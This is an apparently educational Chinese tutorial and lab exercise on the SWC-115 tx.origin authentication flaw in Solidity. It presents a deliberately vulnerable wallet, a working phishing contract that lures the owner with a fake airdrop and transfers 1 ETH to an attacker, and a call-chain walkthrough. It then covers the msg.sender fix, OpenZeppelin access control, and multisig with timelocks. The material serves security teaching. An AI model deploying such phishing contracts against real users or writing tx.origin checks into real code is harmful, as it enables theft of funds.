# tx.origin 与访问控制

**SWC-115** · 难度 ⭐ · 平台案例 5

## msg.sender vs tx.origin

```
EOA (Alice) ──→ ContractA ──→ ContractB
              msg.sender = Alice    msg.sender = ContractA
                                    tx.origin  = Alice
```

- **msg.sender**：当前函数被谁调用——直接调用方
- **tx.origin**：整条调用链最初发起这笔交易的 EOA

错误地用 `tx.origin` 鉴权，意味着只要诱导 owner 调用**任意**合约，那个合约就能借 owner 的身份调用受害函数。

## TxOriginAuth 示例

```solidity
contract TxOriginAuth {
    address public owner;

    constructor() { owner = msg.sender; }

    function transfer(address payable to, uint256 amount) external {
        require(tx.origin == owner, "not owner");   // ❌ 鉴权用 tx.origin
        to.transfer(amount);
    }

    receive() external payable {}
}
```

owner 自己直接调 transfer，没问题；但若 owner 调用一个钓鱼合约，钓鱼合约里再调 transfer——`tx.origin` 仍然是 owner，验证通过。

## 钓鱼合约

```solidity
contract TxOriginPhish {
    IWallet public wallet;
    address payable public attacker;

    constructor(address _wallet, address payable _attacker) {
        wallet = IWallet(_wallet);
        attacker = _attacker;
    }

    /// owner 看到广告"领取空投奖励"点了 attack
    function attack() external {
        wallet.transfer(attacker, 1 ether);
    }
}
```

owner 一时不察调用了 `phish.attack()`，钱包里的 1 ETH 被转给攻击者。

## 调用链分析

```
Owner (EOA, accounts[0])
  → phish.attack()
       msg.sender = Owner     tx.origin = Owner    ✓ 看起来正常
       → wallet.transfer(attacker, 1 ether)
            msg.sender = phish     tx.origin = Owner  ⚠️ 关键
            require(tx.origin == owner)  // ✓ 通过！
            转账完成
```

只要钓鱼合约能让 owner 主动调用一次，资产就完蛋。

## 防御：永远用 msg.sender

```solidity
function transfer(address payable to, uint256 amount) external {
    require(msg.sender == owner, "not owner");   // ✅ 直接调用方
    to.transfer(amount);
}
```

只有 owner 在 EOA 上直接签名调用才能通过；钓鱼合约的 msg.sender 是钓鱼合约本身，不再等于 owner。

## tx.origin 还有什么用？

tx.origin 不是完全没用，但**只能用于"明确希望识别交易最初发起者"**的场景：

- 日志记录："这笔交易最初是谁发起的？"
- 防机器人："只允许 EOA 直接调用，不允许其他合约调用"——通过 `require(tx.origin == msg.sender)` 实现

```solidity
modifier onlyEOA() {
    require(tx.origin == msg.sender, "no contracts");
    _;
}
```

但即便这个用法也有争议，因为合约可在构造函数里调用 msg.sender == tx.origin 时通过（因为合约部署中 msg.sender == tx.origin）。

## OpenZeppelin Ownable

不要自己手写 owner 管理。用：

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract MyContract is Ownable {
    function adminOnly() external onlyOwner {
        ...
    }
}
```

Ownable 的 `onlyOwner` 修饰器内部就是 `require(owner() == _msgSender())`——一定用 msg.sender。

## 更进一步：基于角色的权限 (RBAC)

```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyContract is AccessControl {
    bytes32 public constant MINTER = keccak256("MINTER");

    function mint(address to, uint256 amount) external onlyRole(MINTER) {
        ...
    }
}
```

复杂合约用 AccessControl 划分多角色，比单一 owner 灵活得多，也更易管理。

## 多签 + 时间锁

高危函数（升级、提取国库、改参数）不应由单一 EOA 控制：

```solidity
// 1. 多签持有 owner 角色 (需 N/M 人同意)
Gnosis Safe → MyContract.owner

// 2. 多签做的高危操作还要走 TimelockController
multisig → timelock.schedule(target, data, 2 days)
        ... 等 2 天 ...
multisig → timelock.execute(...)
```

这样即使 owner 被钓鱼，也有 2 天发现窗口可以紧急取消。

## 实战

进入 **tx.origin 鉴权钓鱼** 实验，提交 `TxOriginPhish.sol`。系统模拟 owner (accounts[0]) 被诱导调用了你的钓鱼合约：

```
victim 余额下降：1000000000000000000 -> 0
```

1 ETH 顺利被转走。然后在 fix 模式提交一个用 msg.sender 鉴权的 wallet，看是否能挡住同一钓鱼合约。
